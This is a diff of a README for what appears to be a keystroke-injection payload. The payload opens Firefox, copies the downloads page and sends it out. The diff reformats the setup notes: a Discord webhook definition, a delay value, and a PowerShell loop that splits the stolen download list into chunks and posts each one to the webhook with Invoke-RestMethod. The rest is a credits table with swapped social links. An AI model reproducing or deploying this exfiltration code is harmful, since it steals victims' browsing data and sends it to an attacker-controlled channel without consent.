@@ -19,30 +19,34 @@ This script open the Firefox app, then go to downloads page and copy all, then o
 
 - You must define your Discord webhook if you want to use this method for the exfiltration
 
-    `DEFINE DISCORD_WEBHOOK example`
+  ```shell
+  DISCORD_WEBHOOK='example'
+  ```
 
 - This delay depends on the number of links
 
-    `DELAY 10000`
+  ```plaintext
+  [48] DELAY 5000
+  ```
 
 - This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
 
-    ```
-    $len = $DOWNLOADS.Length
-        $MAX_LEN = 1900
+  ```powershell
+  $len = $DOWNLOADS.Length
+      $MAX_LEN = 1900
 
-        $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)
+      $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)
 
-        for ($i = 0; $i -lt $ITERATIONS; $i++) {
-            $init = $i * $MAX_LEN
-            $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
-            
-            $sub = $DOWNLOADS.Substring($init, $end - $init)
-            $Payload = @{content = $sub} | ConvertTo-Json
+      for ($i = 0; $i -lt $ITERATIONS; $i++) {
+          $init = $i * $MAX_LEN
+          $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
+          
+          $sub = $DOWNLOADS.Substring($init, $end - $init)
+          $Payload = @{content = $sub} | ConvertTo-Json
 
-            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
-        }
-    ```
+          Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
+      }
+  ```
     
 ## Credits
 
@@ -57,16 +61,10 @@ This script open the Firefox app, then go to downloads page and copy all, then o
       <br>Github
     </td>
     <td align="center" width="96">
-      <a href="https://www.instagram.com/alessandro_greco_aka_aleff/">
-        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/instagram.png?raw=true width="48" height="48" />
-      </a>
-      <br>Instagram
-    </td>
-    <td align="center" width="96">
       <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
         <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
       </a>
-      <br>Discord
+      <br>LinkedIn
     </td>
   </tr>
 </table>
